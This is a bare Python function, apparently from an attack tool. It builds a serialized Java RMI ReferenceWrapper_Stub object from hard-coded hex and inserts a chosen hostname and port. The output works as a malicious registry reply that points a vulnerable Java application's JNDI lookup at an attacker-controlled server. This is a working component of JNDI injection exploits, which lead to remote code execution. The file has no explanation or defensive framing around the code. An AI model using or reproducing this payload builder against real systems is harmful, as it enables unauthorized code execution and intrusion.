#com.sun.jndi.rmi.registry.RefeneceWrapper_Stub
def RefeneceWrapper_Stub(hostname:str="127.0.0.1", port:int=51510)->bytes:
    prefix="51aced0005770f0165f4139200000180c766364880027372002f636f6d2e73756e2e6a6e64692e726d692e72656769737472792e5265666572656e6365577261707065725f537475620000000000000002020000707872001a6a6176612e726d692e7365727665722e52656d6f746553747562e9fedcc98be1651a020000707872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000070787077"
    midfix="000a556e6963617374526566"
    postfix="3ebc0b564abdefc265f4139200000180c766364880010178"
    host=hostname.encode().hex()+port.to_bytes(4, byteorder="big").hex()
    length=(len(midfix+host+postfix)//2+1).to_bytes(1, byteorder="big").hex()
    length2=(len(hostname)).to_bytes(2, byteorder="big").hex()
    hexdata=prefix+length+midfix+length2+host+postfix
    data = bytes.fromhex(hexdata)
    return data
